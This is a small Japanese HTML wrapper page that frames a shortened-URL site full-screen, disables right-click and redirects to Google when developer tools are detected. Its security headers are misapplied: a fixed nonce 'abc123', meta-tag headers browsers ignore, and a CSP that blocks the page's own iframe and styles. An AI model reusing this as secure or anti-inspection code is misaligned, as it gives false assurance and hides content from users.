<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    
    <meta http-equiv="Content-Security-Policy" content="
        default-src 'self'; 
        script-src 'self' 'nonce-abc123'; 
        style-src 'self'; 
        img-src 'self'; 
        font-src 'self'; 
        connect-src 'self'; 
        object-src 'none'; 
        frame-ancestors https://coara-chocomaru.github.io https://coarachocomaru.ct.ws;
        upgrade-insecure-requests;
    ">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
    
    <title>マイワールド</title>
    
    <style>
        html, body {
            height: 100%;
            margin: 0;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe id="secure-iframe" src="https://x.gd/nfyks"></iframe>

    <script nonce="abc123">
        // 右クリック禁止
        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
        });

        // デベロッパーツール対策 (iframe では実行しない)
        if (window.self === window.top) { 
            (function() {
                var devtools = /./;
                devtools.toString = function() {
                    window.location.href = 'https://www.google.com'; // もし開いたらgoogleに飛ばす
                };
                console.log(devtools);
            })();
        }
    </script>
</body>
</html>
